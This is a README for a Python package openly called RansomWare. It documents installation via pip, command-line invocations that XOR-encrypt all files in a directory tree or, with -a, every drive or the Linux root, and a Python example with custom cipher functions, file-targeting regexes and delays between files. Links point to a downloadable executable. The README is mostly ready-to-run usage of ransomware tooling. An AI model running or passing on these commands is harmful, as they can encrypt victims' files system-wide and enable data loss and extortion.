# RansomWare

## Description
This package implement a RansomWare.

## Requirements
This package require :
 - python3
 - python3 Standard Library

## Installation
```bash
pip install RansomWare
```

## Launcher

## Command line:
```bash
RansomWare aaa # Crypt all files in current directory and subdirectories with XOR and key aaa
RansomWare -t 56 aaa # Crypt all files in current directory and subdirectories with XOR and key aaa and sleep 56 secondes between file.
RansomWare -e 64 YWFh # Crypt all files in current directory and subdirectories with XOR and key aaa (encoded with base64)
RansomWare -d dir aaa # Crypt all files in dir and subdirectories with XOR and key aaa
RansomWare -a aaa # Encrypt all files on Windows this argument encrypt "A:\", "B:\", "C:\", ... "Z:\". On Linux this argument replace directory by "/".
```

### Python script
```python
from RansomWare import RansomWare

def get_IV(filename: str) -> bytes:
	""" This function return my custom IV. """
	return filename.encode()

def crypt(key: bytes, data:bytes) -> bytes:
	""" This function encrypt data with key. """
	return bytes([(car + key[i % len(key)]) % 256 for i, car in enumerate(data)])

def decrypt(key: bytes, data:bytes) -> bytes:
	""" This function decrypt data with key. """
	return bytes([(car - key[i % len(key)]) % 256 for i, car in enumerate(data)])

cryptolocker = RansomWare(
	b"aaa", # Key
	function_encrypt = crypt, # function to encrypt from key and data
    function_IV = get_IV, # function to get IV from filename
    directory = "dir", # directory to encrypt
    timeBetweenCrypt = 5, # time to sleep between encrypt files
    regexs_filename_to_encrypt = [".*txt", ".*ini"], # encrypt file if filename match with this regex
    regexs_filename_dont_encrypt = ["^/bin.*"], # don't encrypt file if filename match with this regex
)
cryptolocker.launch()

unlock = RansomWare(
	b"aaa", # Key
	function_encrypt = decrypt, # function to decrypt from key and data
    function_IV = get_IV, # function to get IV from filename
    directory = "dir", # directory to decrypt
    timeBetweenCrypt = 5, # time to sleep between decrypt files
    regexs_filename_to_encrypt = [".*txt", ".*ini"], # decrypt file if filename match with this regex
    regexs_filename_dont_encrypt = ["^/bin.*"], # don't decrypt file if filename match with this regex
)
unlock.launch()
```

### Python executable:
```bash
python3 RansomWare.pyz -t 5 -d dir -e 64 YWFh

# OR
chmod u+x RansomWare.pyz # add execute rights
./RansomWare.pyz aaa # execute file
```

### Python module (command line):

```bash
python3 -m RansomWare aaa
python3 -m RansomWare.RansomWare  -t 5 -d dir -e 64 YWFh
```

## Links
 - [Github Page](https://github.com/mauricelambert/RansomWare/)
 - [Documentation](https://mauricelambert.github.io/info/python/security/RansomWare.html)
 - [Download as python executable](https://mauricelambert.github.io/info/python/security/RansomWare.pyz)
 - [Pypi package](https://pypi.org/project/RansomWare/)

## Licence
Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
